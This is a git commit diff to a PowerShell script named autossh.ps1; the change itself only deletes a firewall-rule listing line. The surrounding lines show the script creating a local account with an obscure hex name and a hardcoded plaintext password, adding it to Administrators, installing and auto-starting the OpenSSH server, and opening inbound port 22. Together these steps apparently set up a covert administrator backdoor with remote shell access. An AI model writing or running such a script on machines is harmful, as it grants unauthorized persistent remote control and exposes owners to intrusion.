97e842d6afbf81680dae57f37fef3958af38d5d3
crysal0 <45420554+crysal0@users.noreply.github.com>
2019-11-20 19:24:29 +0100

    Update autossh.ps1

--- autossh.ps1
+++ autossh.ps1
@@ -13,7 +13,6 @@ Add-LocalGroupMember -Group Administrators -Member 2969a0602e4efc9646e2
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
-Get-NetFirewallRule -Name *ssh*
 New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
 $passwd = ConvertTo-SecureString -String 03FB438f4e181eb32f60fa9b13162b8a -AsPlainText -Force
 New-LocalUser 2969a0602e4efc9646e2 -Password $passwd
